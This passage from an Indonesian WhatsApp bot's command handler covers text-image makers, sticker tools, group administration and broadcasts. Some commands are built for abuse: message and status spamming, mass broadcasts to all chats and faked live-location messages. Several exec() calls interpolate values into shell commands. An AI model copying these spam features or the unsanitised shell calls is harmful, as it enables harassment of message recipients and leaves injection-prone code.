	  for (let i = 0; i < oi2; i++) {
	  wann.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
	case 'halloween':
	if (!arg) return reply(from, `Penggunaan ${prefix}halloween teks`, mek)
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${arg}&apikey=${HunterApi}`)
   break
   case 'vampire':
   if (!arg) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${arg}&apikey=${HunterApi}`)
   break
   case 'codetxt':
   if (!arg) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${arg}&apikey=${HunterApi}`)
   break
case 'matrix':
				if (!arg) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${arg}&apikey=${HunterApi}`)
				break
				case 'googletxt':
				if (!arg) return reply(from, `Penggunaan ${prefix}googletxt teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
				break
				case 'spiderman':
				if (!arg) return reply(from, `Penggunaan ${prefix}sipderman teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
				break
				case 'express':
				if (!arg) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
				break
				case 'dance':
				if (!arg) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${arg}&apikey=${HunterApi}`)
				break
				case 'blackbird':
				if (!arg) return reply(from, `Penggunaan ${prefix}blackbird teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${arg}&apikey=${HunterApi}`)
				break
				case 'text3d':
				if (!arg) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${arg}&apikey=${HunterApi}`)
				break
				case 'warrior':
				if (!arg) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${arg}&apikey=${HunterApi}`)
				break
				case 'd':
				case 'del':
				case 'delete':
					wann.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'colong':
		if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await wann.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    wann.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
					fs.unlinkSync(meidia)
					fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
				})
				break
				case 'readmore':
			    	case 'more':
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!c.includes('|')) return  reply(mess.error.api)
                    const text1 = c.substring(0, c.indexOf('|') - 0)
                    const text2 = c.substring(c.lastIndexOf('|') + 1)
                    wann.sendMessage(from, `${text1 + readmore + text2}`, text, {quoted:mek})
                    break
                    case 'delchat':
                    if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
                reply('Sukses menghapus chat' + from)
                await sleep(4000)
                wann.modifyChat(from, ChatModification.delete)
                break
				case 'clearall':
				if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					anu = await wann.chats.all()
					wann.setMaxListeners(10)
					for (let _ of anu) {
						wann.clearMessage(_.jid)
					}
					reply('Sukses membersihkan semua pesan')
					break
					case 'mute':
			    if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot berhasil dimute di chat ini')
                break
					case 'restart':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
reply(`_Restarting ${NamaBot}_`)
exec(`cd &&  node invibot`)
sleep(4000)
reply('Sukses')
break
				case 'detikvn':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await wann.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						wann.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await wann.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						wann.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(median)
				break
				 case 'antilink':
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antilink 1`)
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('Sudah Aktif Kak')
						antilink.push(from)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan fitur antilink')
						wann.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti link\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiLink) return reply('Sudah Mati Kak')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Sukses menonaktifkan fitur antilink')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break
					case 'antibug':
          if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
          if (args[0] === '1') {
          bugc = true
          reply('Sukses mengaktifkan fitur antibug')
          wann.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti buggc\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
          } else if (args[0] === '0') {
          bugc = false
          reply('Sukses menonaktifkan fitur antibug')
          } else {
          reply('1 untuk mengaktifkan, 0 untuk mematikan')
          }
          break
				case 'tinyurl':
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
break
case 'sharelock':
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
wann.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: ofrply}, MessageType.liveLocation, {quoted:floc})
break
case 'tts':
					  try{
        if (args.length > 1) {
        const gtts = require('./lib/gtts')(args[0])
        if (args.length < 2) return wann.sendMessage(from, 'Textnya mana gan?', text, {quoted: mek})
        ngab = budy.slice(7)
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        ngab.length > 600
        ? reply('Textnya kebanyakan gan')
        : gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply('Gagal gan:(')
                wann.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	} else if ( args.length === 1 ){
		ngab = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
		const gtts = require('./lib/gtts')(args[0])
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply(mess.error.api)
                wann.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	}
} catch (e){
	reply(mess.error.api)
}
break 
				case 'demote':
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			demote = mek.message.extendedTextMessage.contextInfo.participant
		    wann.groupDemoteAdmin(from, [demote])
						reply('Sukses demote admin')
						break
					case 'promote':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			promote = mek.message.extendedTextMessage.contextInfo.participant
		    wann.groupMakeAdmin(from, [promote])
						reply('Sukses promote member')
						break
				case 'linkgrup':
				case 'linkgroup':
				case 'linkgc':
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					linkgc = await wann.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
					wann.sendMessage(from, yeh, text, { quoted: mek })
					break
					case 'resetlinkgc':
         case 'resetlinkgroup':
         case 'revoke':
         if (!isGroup) return reply(mess.only.group)
         if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
          json = ['action', 'inviteReset', from]
         wann.query({json, expect200: true})
          reply('Sukses Mereset Link Group')
         break
					case 'opengc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                   reply(`Sukses membuka grup ${groupName}`)
						wann.groupSettingChange(from, GroupSettingChange.messageSend, false)
						break
						case 'closegc':
						if (!isGroup) return reply(mess.only.group)
						if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
						reply(`Sukses menutup grup ${groupName}`)
						wann.groupSettingChange(from, GroupSettingChange.messageSend, true)
					break
				case 'spam':
				if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					wann.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
		if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                wann.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
		if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                wann.groupMakeAdmin(from, members_id)
                break
				case 'setnamegc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					wann.groupUpdateSubject(from, `${body.slice(11)}`)
					reply(`Sukses mengganti nama grup ke ${body.slice(11)}`)
					break					
				case 'setdeskgc':
				case 'setdescgc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					wann.groupUpdateDescription(from, `${body.slice(10)}`)
					reply(`Sukses mengganti deskripsi grup ke ${body.slice(10)}`)
					break
				case 'setprofile':
				case 'setpp':
				wann.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await wann.downloadAndSaveMediaMessage(enmediau)
					await wann.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
				case 'leave':
				if (!isGroup) return reply(mess.only.group)
				if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
				wann.updatePresence(from, Presence.composing)
				wann.groupLeave(from)
						break
				case 'bc':
					wann.updatePresence(from, Presence.composing)
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Teksnya?')
					anu = await wann.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wann.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							wann.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wann.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							wann.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wann.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							wann.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break
					case 'bc':
case 'broadcast':
if (isBanned) return reply(mess.ban)
if (isBanchat) return
if (!isOwner && toll.key.fromMe) return  reply(mess.only.owner)
if (args.length < 1) return reply('teks?')
anu = await wann.chats.all()
if (isMedia && !toll.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : toll
bc = await wann.downloadMediaMessage(encmedia)
for (let _ of anu) {
wann.sendMessage(_.jid, bc, image, {quoted:finv,caption: `*「 BROADCAST [ • INVIBOT • ] 」*\n\n${body.slice(4)}`})
}
reply('Suksess broadcast')
} else {
for (let _ of anu) {
sendMess(_.jid, `*「 INVIBOT BROADCAST 」*\n\n${body.slice(4)}`)
}
reply('Suksess broadcast')
}
break

case 'bc2':
case 'broadcast2':
if (isBanned) return reply(mess.ban)
if (isBanchat) return
             if (!isOwner && !toll.key.fromMe) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             reply('Wait.....')
             anu = await wann.chats.all()
             if (isMedia && !toll.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : toll
             bc = await wann.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             wann.sendMessage(_.jid, bc, image, {quoted: floc,caption: `*「 BROADCAST [ • INVIBOT • ] 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
wann.sendMessage(_.jid, 
	    {"contentText": `*「 BROADCAST [ • INVIBOT • ] 」*\n\n${body.slice(4)}`,
	    "footerText": '© 𝓒𝓻𝓮𝓪𝓽𝓮𝓭 𝓑𝔂 𝓦𝓪𝓷𝓷',
	    "buttons": [
	    {"buttonId": `owner`,
	    "buttonText": {"displayText": "OWNER"
	    },"type": "RESPONSE"}
	    ], "headerType": 1,
	    }, MessageType.buttonsMessage, {quoted: floc})
}
             reply('Suksess broadcast')
}
             break
					case 'spamsw':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					wann.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
				case 'upswteks':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    wann.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    wann.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${NamaBot}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wann.downloadMediaMessage(encmedia)
						wann.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wann.downloadMediaMessage(encmedia)
						wann.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wann.downloadMediaMessage(encmedia)
						wann.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await wann.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    wann.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await wann.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    wann.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await wann.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    wann.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
				return wann.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
				case 'tomp4':
					if (!isQuotedSticker) return reply('Reply stiker nya')
                                        reply(mess.wait)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await wann.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result)
            })
            }else {
            reply('Reply Stickernya!')
            }
            fs.unlinkSync(owgi)
            break
            case 'tomp3':
					wann.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return reply('Reply Video Nya Kak')
					reply(mess.wait)
					encmediad = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					mediad = await wann.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						wann.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
				case 'suit':
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang ??",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
		    case 'slot':
            case 'slots':
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            wann.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: mek })
            break
				case 'kontak':
				if (!isGroup) return reply(mess.only.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(mess.only.admin)
                argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				case 'getdeskgc':
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await wann.groupMetadata(anu)
				wann.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
					case 'getbio':
	  var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await wann.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply(mess.error.api)
}
break
                    case 'getname':
        var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = wann.contacts[ambl] != undefined ? wann.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : wann.contacts[ambl].notify || wann.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
break
				case 'getpict':
				case 'getpic':
					if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await wann.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            wann.sendMessage(from, pict, image, {quoted: mek})
            break
				case 'chat':
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            wann.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
				case 'attp':
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp ${NamaBot}`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
					wann.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
				case 'semoji':
			if (args === 0) return reply('emojinya?')   
		   aku4 = args.join(' ')
           emoji.get(`${aku4}`).then(emoji => {
           link = `${emoji.images[10].url}`
		   sendWebp(from, `${link}`).catch(() => reply('gagal'))
           })
    	   break
				case 'tag':
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					wann.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					wann.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
				case 'join':
				if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.owner)
				 if (args.length < 1) return ephe('Link nya mana?')
					wann.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply('Sukses bergabung dalam group')
break
				case 'totag':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await wann.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await wann.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            wann.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await wann.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await wann.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            wann.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
